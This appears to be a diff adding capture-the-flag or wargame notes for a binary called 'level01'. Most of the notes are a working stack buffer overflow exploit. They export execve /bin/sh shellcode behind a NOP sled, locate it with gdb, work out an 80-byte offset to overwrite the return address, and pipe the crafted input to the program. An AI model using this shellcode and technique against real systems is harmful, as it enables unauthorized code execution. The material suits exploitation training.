@@ -1,0 +1,18 @@
+decompile ./level01
+
+username is : dat_wil and password is admin but not checked
+we can buffer overflow the second fgets for the password to change the IEP to a shellcode
+export the shellcode to the env: 
+	`export SHELLCODE=$(python -c 'print "\x90" * 1024 + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')`
+
+get the adress of the env variable with gdb: -start; p/x getenv("SHELLCODE")
+aim a bit farther in the nospled (+0x200)
+get the offset to change the IEP:
+			-(p/x $EBP) - (p/x adress of buffer)
+			- here its 76 + 4 for the ebp
+
+so we write "dat_wil\n" for thr first check 
++ "A" * 80 + adress of SHELLCODE:
+`echo "dat_wil" > /tmp/level01
+ python -c 'print "A" * 80 + "\xdc\xd6\xff\xff"' >> /tmp/level01
+ cat /tmp/level01 - | ./level01`
